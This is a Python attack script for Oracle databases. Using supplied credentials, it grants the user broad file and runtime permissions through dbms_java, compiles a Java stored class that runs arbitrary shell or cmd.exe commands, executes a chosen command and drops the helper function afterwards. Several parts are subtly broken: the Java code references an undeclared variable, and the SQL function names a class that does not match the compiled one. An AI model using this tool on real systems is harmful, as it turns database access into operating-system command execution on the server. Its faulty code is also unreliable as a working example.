#!/usr/bin/env python
# -*- coding: utf-8 -*-
# File: ora_exec_cmd.py
# Author: catchermana

import getopt
import sys
import cx_Oracle

def usage():
    
    print('Usage: python %s [options]' % sys.argv[0])
    print('')
    print('Options:')
    print('  -h HOST, --host=HOST              target server address')
    print('  -u USER, --user=USER              Username')
    print('  -p PASS, --pass=PASS              Password')
    print('  -s SID, --sid=SID                 Target Sid Name')
    print('  -P PORT, --port=PORT              Oracle Port')
    #print('  -b BYPASS, --bypass=BYPASS        Bypass Creation Of Evil Functions')
    print('  -c COMMAND, --command=COMMAND     COMMAND')

def connectDB(host = '',user = '',passwd = '',sid = '',port = 1521):

        try:
                connstr = '%s/%s@%s:%d/%s' % (user,passwd,host,int(port),sid)
                conn=cx_Oracle.connect(connstr)
        except cx_Oracle.DatabaseError as e:
                print str(e)
                sys.exit(-1)

        return conn

def main():

    try:
        opts, args = getopt.getopt(sys.argv[1:], 'h:u:p:s:P:c:', ['host=', 'user=', 'passwd=', 'sid=', 'port=', 'command='])
    except getopt.GetoptError as e:
        print('[-] %s' % (str(e)))
        usage()
        sys.exit(2)
    
    host = ''
    user = ''
    passwd = ''
    sid = ''
    port = 1521
    command = ''

    for o, a in opts:
        if o in ('-h', '--host'):
            host = a
        elif o in ('-u','--user'):
            user = a
        elif o in ('-p','--passwd'):
            passwd = a
        elif o in ('-s','--sid'):
            sid = a
        elif o in ('-P','--port'):
            port = a
        elif o in ('-c','--command'):
            command = a
        else:
            pass

    if not host:
        print ('[!] host not be empty !')
        usage()
        sys.exit(2)

    elif not user:
        print ('[!] username not be empty!')
        usage()
        sys.exit(2)

    elif not passwd:
        print ('[!] password not be empty!')
        usage()
        sys.exit(2)

    elif not sid:
        print ('[!] sid not be empty!')
        usage()
        sys.exit(2)

    elif not command:
        print ('[!] command not be empty!')
        usage()
        sys.exit(2)

    #conn = connectDB('127.0.0.1','Oracle','123456','sdfsdf','dbtest',1521)
    conn = connectDB(host,user,passwd,sid,port)
    cursor = conn.cursor()

    print ("[-] Setting permissions...\n")
    setpermission = ''' BEGIN
                                                dbms_java.grant_Permission('{0}', 'java.io.FilePermission', '<<ALL FILES>>', 'read ,write, execute, delete');
                                                dbms_java.grant_Permission('{0}', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
                                                dbms_java.grant_Permission('{0}', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
                                    END;'''.format(user.upper())
    cursor.execute(setpermission)
    #conn.commit()

    print ("[-] Creating Java class...\n")
    createjava = '''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String run_cmd(String args) {try {String[] fCmd;if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {fCmd = new String[3];fCmd[0] = "C:\\\\windows\\\\system32\\\\cmd.exe";fCmd[1] = "/c";fCmd[2] = command;}else {fCmd = new String[3];fCmd[0] = "/bin/sh";fCmd[1] = "-c";fCmd[2] = command;}final Process pr = Runtime.getRuntime().exec(fCmd);pr.waitFor();new Thread(new Runnable(){public void run() {BufferedReader br_in = null;try {br_in = new BufferedReader(new InputStreamReader(pr.getInputStream()));String buff = null;while ((buff = br_in.readLine()) != null) {System.out.println(buff);try {Thread.sleep(100); } catch(Exception e) {}}br_in.close();}catch (IOException ioe) {System.out.println("Exception caught printing process output.");ioe.printStackTrace();}finally { try { br_in.close(); } catch (Exception ex) {} }}}).start();new Thread(new Runnable(){public void run() {BufferedReader br_err = null;try {br_err = new BufferedReader(new InputStreamReader(pr.getErrorStream()));String buff = null;while ((buff = br_err.readLine()) != null) {System.out.println("Error: " + buff);try {Thread.sleep(100); } catch(Exception e) {}}br_err.close();}catch (IOException ioe) {System.out.println("Exception caught printing process error.");ioe.printStackTrace();}finally { try { br_err.close(); } catch (Exception ex) {} }}}).start();}catch (Exception ex){System.out.println(ex.getLocalizedMessage());}}};'''
    cursor.execute(createjava)

    print ("[-] Creating function...\n")
    creatfunc = '''create or replace function run_cmd( p_cmd in varchar2) return number as language java name 'Util.runthis(java.lang.String) return integer';'''
    cursor.execute(creatfunc)

    print ("[-] Creating procedure...\n")
    creatproc = '''create or replace procedure rc(p_cmd in varchar2) as x number; begin x := run_cmd(p_cmd);end;'''
    cursor.execute(creatproc)

    print ("[-] Exec cmd...\n")
    cmd = '''DECLARE
                l_output DBMS_OUTPUT.chararr;
                l_lines  INTEGER := 1000;

             begin
                DBMS_OUTPUT.enable(1000000); 
                        DBMS_JAVA.SET_OUTPUT(1000000);
                    rc('{0}');

             DBMS_OUTPUT.get_lines(l_output, l_lines);
             FOR i IN 1 .. l_lines LOOP
                DBMS_OUTPUT.put_line(l_output(i));
                NULL;
             END LOOP;
                     end;'''.format(command)
    cursor.execute(cmd)

    print ("[-] Drop function...\n")
    dropfunc = '''BEGIN 
                    drop function run_cmd;
                  END;'''
    cursor.execute(dropfunc)

    cursor.close()
    conn.close()

if __name__ == '__main__':

    main()
